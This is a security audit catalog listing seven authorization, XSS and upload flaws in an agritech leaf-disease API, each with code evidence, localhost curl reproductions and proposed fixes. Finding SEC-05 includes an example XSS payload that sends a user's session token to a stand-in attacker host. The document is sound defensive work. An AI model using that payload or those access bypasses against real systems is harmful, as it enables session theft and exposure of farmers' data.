# GARI AGRITECH AI LAB — SECURITY FINDINGS CATALOG
## Vulnerability Registry, Technical Evidence & Remediation Specifications

**Audit Standard:** OWASP Top 10 API Security Risks (2023) / NIST SP 800-115  
**Audit Date:** 2026-11-10  
**Project:** `D:\leaf-diseases-detector-main`

---

## Summary of Findings

| ID | Title | OWASP Category | Severity | File & Location | Status |
| :---: | :--- | :--- | :---: | :--- | :---: |
| **SEC-01** | Anonymous Leaf Disease Diagnoses Exposure | API1:2023 Broken Object Level Auth | **CRITICAL** | `api_server.py:1891-1954`, `gari_database.py:1707` | Identified |
| **SEC-02** | Default User 1 Fallback in Notifications, Tasks & Copilot | API1:2023 Broken Object Level Auth | **CRITICAL** | `api_server.py` (19 endpoints) | Identified |
| **SEC-03** | Cross-Organization Farm Enumeration (BOLA) | API1:2023 Broken Object Level Auth | **HIGH** | `api_server.py:1130-1136`, `gari_farm_management.py:436` | Identified |
| **SEC-04** | Unassigned Expert Consultation Chat Interception | API5:2023 Broken Function Level Auth | **HIGH** | `api_server.py:7704-7730` | Identified |
| **SEC-05** | Stored Cross-Site Scripting (XSS) via Unescaped innerHTML | API8:2023 Security Misconfiguration | **MEDIUM** | `frontend2/*.html`, `frontend2/app.js` | Identified |
| **SEC-06** | Hardcoded Email Platform Admin Privilege Escalation | API5:2023 Broken Function Level Auth | **MEDIUM** | `gari_auth.py:542` | Identified |
| **SEC-07** | Missing Size & MIME Signature Check in Field Upload API | API4:2023 Unrestricted Resource Consumption | **LOW** | `api_server.py:5280-5310` | Identified |

---

## Detailed Findings

---

### [SEC-01] Anonymous Leaf Disease Diagnoses Exposure
- **Severity:** **CRITICAL**
- **OWASP Category:** API1:2023 — Broken Object Level Authorization (BOLA)
- **Files & Lines:**
  - `api_server.py:1891-1910` (`list_diagnoses`)
  - `api_server.py:1936-1954` (`get_diagnosis_detail`)
  - `gari_database.py:1707-1715` (`list_diagnoses`)
- **Evidence:**
  ```python
  # api_server.py:1897
  current_user: Optional[Dict[str, Any]] = Depends(get_current_user_optional)
  ...
  user_id = current_user["id"] if current_user else None
  diagnoses = gari_database.list_diagnoses(user_id=user_id, ...)
  ```
  In `gari_database.py:1707`:
  ```python
  if user_id is not None and organization_id is not None:
      query += " AND (user_id = ? OR organization_id = ?)"
  elif user_id is not None:
      query += " AND user_id = ?"
  elif organization_id is not None:
      query += " AND organization_id = ?"
  # When both user_id and organization_id are None:
  # The WHERE 1=1 clause is untouched and the database returns all records!
  ```
  In `api_server.py:1943`:
  ```python
  if current_user:
      # runs ownership check
  # If current_user is None: ownership check is bypassed entirely!
  return {"success": True, "diagnosis": d}
  ```
- **Real-World Impact:** An unauthenticated visitor or malicious bot calling `GET /api/diagnoses` can harvest agricultural health data, plot locations, farmer user IDs, severity scores, and image paths across the entire platform.
- **Safe Reproduction:**
  ```bash
  curl -X GET "http://127.0.0.1:8000/api/diagnoses"
  ```
  *(Returns HTTP 200 with an array of farmer diagnoses).*
- **Proposed Remediation:**
  Change dependency from `get_current_user_optional` to `get_current_user`:
  ```python
  @app.get("/api/diagnoses")
  async def list_diagnoses(
      farm_id: Optional[int] = None,
      plot_id: Optional[int] = None,
      crop_id: Optional[str] = None,
      org_id: Optional[int] = None,
      current_user: Dict[str, Any] = Depends(get_current_user)
  ):
  ```
  In `get_diagnosis_detail`: Require `current_user: Dict[str, Any] = Depends(get_current_user)`.
- **Fix Risk & Rollback:** Low risk. Unauthenticated visitors are redirected to login.

---

### [SEC-02] Default User 1 Fallback in Notifications, Tasks & Copilot
- **Severity:** **CRITICAL**
- **OWASP Category:** API1:2023 — Broken Object Level Authorization (BOLA)
- **Files & Lines:** `api_server.py` at lines:
  - 1866, 1874, 1882 (`/api/notifications`, `/api/notifications/{id}/read`, `/api/notifications/mark-all-read`)
  - 2289 (`/api/risk/alerts/{id}/acknowledge`)
  - 2328, 2356, 2379, 2406, 2419, 2435, 2454, 2473 (`/api/calendar/tasks/*`)
  - 2511, 2528, 2543 (`/api/copilot/*`)
  - 2566, 2613, 2624, 2659 (`/api/assistant/chat`, etc.)
- **Evidence:**
  ```python
  # api_server.py:1866
  user_id = current_user["id"] if current_user else 1
  notifs = gari_database.list_notifications(user_id=user_id)
  ```
- **Real-World Impact:**
  - Anonymous users can read and mark read all private system notifications sent to User 1 (typically the System Administrator / Founder).
  - Anonymous users can create, update, complete, and delete cultivation calendar tasks belonging to User 1.
  - Anonymous users query AI Copilot using User 1's plot and farm context, bypassing entitlement quotas.
- **Safe Reproduction:**
  ```bash
  curl -X GET "http://127.0.0.1:8000/api/notifications"
  curl -X GET "http://127.0.0.1:8000/api/calendar/tasks"
  ```
- **Proposed Remediation:**
  Enforce authentication via `Depends(get_current_user)` and remove `user_id = ... if ... else 1`:
  ```python
  @app.get("/api/notifications")
  async def get_notifications(current_user: Dict[str, Any] = Depends(get_current_user)):
      notifs = gari_database.list_notifications(user_id=current_user["id"])
      return {"success": True, "total": len(notifs), "notifications": notifs}
  ```
- **Fix Risk & Rollback:** Low risk. Cleanly separates authenticated users from guests.

---

### [SEC-03] Cross-Organization Farm Enumeration (BOLA)
- **Severity:** **HIGH**
- **OWASP Category:** API1:2023 — Broken Object Level Authorization
- **Files & Lines:**
  - `api_server.py:1130-1137` (`get_farms`)
  - `gari_farm_management.py:436-439` (`list_farms_ext`)
- **Evidence:**
  ```python
  # api_server.py:1130
  @app.get("/api/farms")
  async def get_farms(status: Optional[str] = "active", org_id: Optional[int] = None, current_user: Dict = Depends(get_current_user)):
      farms = gari_farm_management.list_farms_ext(user_id=current_user["id"], org_id=org_id, status=status)
  ```
  In `gari_farm_management.py:436`:
  ```python
  if org_id is not None:
      where_clauses.append("f.organization_id = ?")
      params.append(org_id)
  # user_id is completely ignored when org_id is present, without checking membership!
  ```
- **Real-World Impact:** An authenticated user from Organization A can enumerate all farms, locations, crop types, and acreage belonging to Organization B simply by passing `?org_id=B`.
- **Safe Reproduction:**
  Authenticate as User A (member of Org 1). Call `GET /api/farms?org_id=2`. The endpoint returns Org 2's farms.
- **Proposed Remediation:**
  In `api_server.py:1130`:
  ```python
  if org_id is not None:
      if not gari_b2b.get_member_role(org_id, current_user["id"]) and not current_user.get("is_admin", False):
          raise HTTPException(status_code=403, detail="Bạn không thuộc tổ chức này.")
  ```
- **Fix Risk & Rollback:** Zero negative impact on legitimate users.

---

### [SEC-04] Unassigned Expert Consultation Chat Interception
- **Severity:** **HIGH**
- **OWASP Category:** API5:2023 — Broken Function Level Authorization
- **Files & Lines:** `api_server.py:7704-7708`, `api_server.py:7726-7730`
- **Evidence:**
  ```python
  # api_server.py:7704
  is_owner = case.get("user_id") == current_user["id"]
  is_exp = bool(current_user.get("is_expert"))
  is_host = bool(current_user.get("is_host_admin"))

  if not (is_owner or is_exp or is_host):
      raise HTTPException(status_code=403, detail="Bạn không có quyền xem trao đổi ca bệnh này.")
  ```
- **Real-World Impact:** Any user with `is_expert = 1` can view and write messages into diagnostic cases handled by another expert, compromising farmer-expert confidentiality and treatment plans.
- **Safe Reproduction:**
  Authenticate as Expert 1. Retrieve case messages for Case #50 where `assigned_expert_id = 99` (Expert 2). Messages are returned successfully.
- **Proposed Remediation:**
  ```python
  is_assigned_expert = (
      case.get("assigned_expert_id") == current_user["id"]
      or case.get("expert_user_id") == current_user["id"]
  )
  if not (is_owner or is_assigned_expert or is_host):
      raise HTTPException(status_code=403, detail="Bạn không có quyền truy cập ca bệnh này.")
  ```
- **Fix Risk & Rollback:** Low risk. Ensures only assigned experts or host admins can participate.

---

### [SEC-05] Stored Cross-Site Scripting (XSS) via Unescaped `innerHTML`
- **Severity:** **MEDIUM**
- **OWASP Category:** API8:2023 — Security Misconfiguration / Client-Side Injection
- **Files & Lines:** `frontend2/farms.html` (lines 878, 1033, 1046, 1840, 2322), `frontend2/app.js`, etc.
- **Evidence:**
  ```javascript
  // frontend2/farms.html:1050
  listEl.innerHTML = zones.map(z => `
      <strong style="font-size:13.5px; color:var(--text-main);">${z.name}</strong>
  `);
  ```
- **Real-World Impact:** If an attacker creates a farm, zone, or task with payload `<img src=x onerror="fetch('//attacker.com/?t='+localStorage.getItem('gari_token'))">`, any administrator, member, or expert viewing the list will execute the script, leading to session token theft.
- **Proposed Remediation:**
  Define an HTML escaping utility in `frontend2/app.js`:
  ```javascript
  function escapeHtml(str) {
      if (!str) return '';
      return String(str)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#39;');
  }
  ```
  Wrap all dynamic template interpolations (`${escapeHtml(z.name)}`).
- **Fix Risk & Rollback:** Low risk. Prevents tag injection without altering visual layout.

---

### [SEC-06] Hardcoded Email Platform Admin Privilege Escalation
- **Severity:** **MEDIUM**
- **OWASP Category:** API5:2023 — Broken Function Level Authorization
- **Files & Lines:** `gari_auth.py:542`
- **Evidence:**
  ```python
  # gari_auth.py:542
  is_admin = bool(user.get("is_admin")) or account_type in ("admin", "quản trị viên", "platform_admin") or email in ("danhuynh@gari.vn", "admin@gari.vn")
  ```
- **Real-World Impact:** If self-registration or email verification is misconfigured, registering an account with `admin@gari.vn` automatically grants administrative access to platform control panels.
- **Proposed Remediation:**
  Remove hardcoded email comparisons. Admin status must strictly depend on database flags `is_admin = 1` or `is_host_admin = 1` managed through `tools/create_host_admin.py` or host admin console.
- **Fix Risk & Rollback:** Low risk. Ensure the real founder user has `is_admin = 1` in `database/disease_detector.db` before deploying the change.

---

### [SEC-07] Missing Size & MIME Signature Check in Field Upload API
- **Severity:** **LOW**
- **OWASP Category:** API4:2023 — Unrestricted Resource Consumption
- **Files & Lines:** `api_server.py:5280-5310` (`upload_field_image`)
- **Evidence:**
  The endpoint reads `await image.read()` into memory without checking `MAX_UPLOAD_SIZE_BYTES` or validating with PIL before passing to `field_manager.add_image`.
- **Proposed Remediation:**
  Add file size guard (15MB) and PIL verification similar to `api_server.py:4442`.
- **Fix Risk & Rollback:** Low risk.

